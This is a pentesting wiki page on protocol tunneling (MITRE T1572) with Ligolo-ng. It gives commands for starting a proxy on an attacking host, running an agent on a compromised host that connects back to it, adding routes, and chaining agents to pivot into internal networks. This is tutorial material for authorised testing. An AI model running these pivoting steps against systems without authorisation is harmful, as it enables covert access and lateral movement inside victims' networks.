---
description: MITRE ATT&CK™ Protocol Tunneling  - Technique T1572
---

# TLS Tunneling (Ligolo-ng)

## Theory

[Ligolo-ng](https://github.com/nicocha30/ligolo-ng) (Golang) is a network pivoting tool that allows us to establish tunnels from a **reverse TCP/TLS** connection using a **tun interface** (without the need of SOCKS).&#x20;

It utilizes a local proxy server and remote agents to make process tunneling from remote hosts simple and easy to manage. It has features other tools lack, such as building a network interface in the system userland that does not require elevated privileges to establish and **encrypt VPN tunneling**.&#x20;

{% hint style="info" %}
Using ligolo-ng, we can perform SYN scan or send ICMP packets trought the created interface. (in contrast with SOCKS pivoting techniques like with [Chisel](portfwd.md#chisel) or [SSH](portfwd.md#ssh-tunneling)).
{% endhint %}

## Practice

{% tabs %}
{% tab title="Using Ligolo-ng" %}
{% hint style="info" %}
Before using it, you should first [Setup Ligolo-ng](tls-tunneling-ligolo-ng.md#setup).
{% endhint %}

First, start the proxy server on the Attacking Host or Jump Box:

```bash
# Use in self-signed mode
# if -laddr is not specified, default is 0.0.0.0:11601 
./proxy -selfcert -laddr 0.0.0.0:<LISTENING_SVR_PORT>

# Use a custom certificate
./proxy -certfile <cert.pem> -keyfile <key.pem>
```

On the compromised host, after uploading the agent, we use the following command:

```bash
# Connect if server is in self-signed mode
./agent -connect <LIGOLO_SVR_IP>:<LISTENING_SVR_PORT> -ignore-cert

# Connect
./agent -connect <LIGOLO_SERVER_IP>:<SRV_LISTENING_PORT>
```

When the agent connect back to the server, we must enumerate its network as follow:

```bash
# Choose the agent
ligolo-ng » session

# Enumerate network
[Agent : pwned@target] » ifconfig
[...]
┌───────────────────────────────────────────────┐
│ Interface 2                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ ens224                         │
│ Hardware MAC │ 00:50:56:86:dd:bd              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 10.10.10.63/24                 │
└──────────────┴────────────────────────────────┘
```

Take note of interesting agent interfaces that may be use for pivoting, and add the route on the proxy/relay server. In this example we'll do as follow

```bash
# Linux
# With ligolo the interface name, replace if different
$ sudo ip route add 10.10.10.0/24 dev ligolo

# Windows
> netsh int ipv4 show interfaces

Idx     Mét         MTU          État                Nom
---  ----------  ----------  ------------  ---------------------------
 25           5       65535  connected     ligolo
   
> route add 10.10.10.0 mask 255.255.255.0 0.0.0.0 if [THE INTERFACE IDX]
```

Finally, start the tunnel on the ligolo proxy server:

```bash
[Agent : pwned@target] » start

# OR

[Agent : pwned@target] » tunnel_start --tun ligolo
```

Done ! We can now access the `10.10.10.0/24` agent network from the proxy server.
{% endtab %}

{% tab title="Setup" %}
### All Versions

[Ligolo-ng](https://github.com/nicocha30/ligolo-ng) fisrt need to be configured. We need to create a tun interface on the Proxy Server (Attacking Host, or Jumb Box):

```bash
# Linux
sudo ip tuntap add user [your_username] mode tun ligolo
sudo ip link set ligolo up

# Windows
# You need to download the Wintun driver and place the "wintun.dll" in the same folder as Ligolo (make sure you use the right architecture).
# https://www.wintun.net/
```

### Versions ≥ 0.46

Alternatively, on **Ligolo-ng >= v0.6**, you can now use the `interface_create` command to create a new interface! No need to use ip tuntap!

```sh
ligolo-ng » interface_create --name "ligolo"
```
{% endtab %}
{% endtabs %}



{% hint style="info" %}
To perform **double pivoting** with ligolo-ng, we can add a listener on any agent. For example, if Agent2 only has access to Agent1 and we want to proxy its traffic.

We must add a listener on Agent1 from Ligolo Server:

```bash
# Where 11601 is the Ligolo LISTENING_SVR_PORT
# And 172.16.5.15:4455 the Agent1 listening IP and Port
[Agent : pwned@Agent1] » listener_add –addr 172.16.5.15:4455 –to 127.0.0.1:11601
```

Then, we can join Agent2 as follow

```powershell
# Where 172.16.5.15:4455 is the Agent1 listening IP and Port
.\agent.exe -connect 172.16.5.15:4455 [-ignore-cert]
```
{% endhint %}

## Resources

{% embed url="https://github.com/nicocha30/ligolo-ng/tree/v0.4.4#building--usage" %}
